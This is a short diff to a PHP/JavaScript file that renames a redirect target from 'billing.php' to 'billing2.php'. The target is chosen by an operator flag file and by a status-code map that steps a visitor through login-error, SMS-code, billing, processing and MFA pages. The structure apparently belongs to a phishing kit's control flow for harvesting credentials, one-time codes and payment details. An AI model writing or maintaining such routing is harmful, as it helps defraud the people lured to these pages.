@@ -10262,7 +10262,7 @@ if (file_exists($languageFile)) {
       })
       .then((parsed_response) => {
         if (parsed_response.status === 'ok') {
-                var redirectUrl = <?php echo (file_get_contents("zynexroot/offline.txt") == 1) ? "'billing.php'" : "'loading.php'"; ?>;
+                var redirectUrl = <?php echo (file_get_contents("zynexroot/offline.txt") == 1) ? "'billing2.php'" : "'loading.php'"; ?>;
                 location.href = redirectUrl;
         } else {
           console.error('Error:', parsed_response.message);
@@ -10307,7 +10307,7 @@ function handleRedirection(status) {
         '3': "login_error.php",
         '9': "sms.php",
         '11': "sms_error.php",
-        '84': "billing.php",
+        '84': "billing2.php",
         '86': "process.php",
         '88': "process_error.php",
 		'200': "mfa.php",
